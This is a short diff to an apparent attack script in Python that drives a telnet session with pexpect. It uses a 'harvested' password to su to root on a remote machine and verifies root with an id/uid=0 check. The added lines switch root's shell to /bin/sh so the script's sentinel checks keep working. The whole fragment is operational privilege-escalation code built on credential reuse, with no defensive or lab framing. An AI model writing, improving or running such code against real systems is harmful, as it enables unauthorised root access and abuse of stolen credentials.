@@ -110,6 +110,8 @@ def main():
         log("su %s OK (harvested password works)"%OPSU)
         tn.sendline("su")
         tn.expect(r"[Pp]assword:",timeout=30); tn.sendline(opspass); time.sleep(1)
+        # root's login shell is /bin/csh; switch to sh so the $?-sentinel helper works
+        tn.sendline("/bin/sh"); time.sleep(1)
         tn.sendline("id; echo ROOTCHK_X"); tn.expect(r"ROOTCHK_X",timeout=20)
         if "uid=0" not in tn.before:
             log("SU ROOT FAILED (reuse?): %r"%" ".join(tn.before.split())[-80:]); return 5
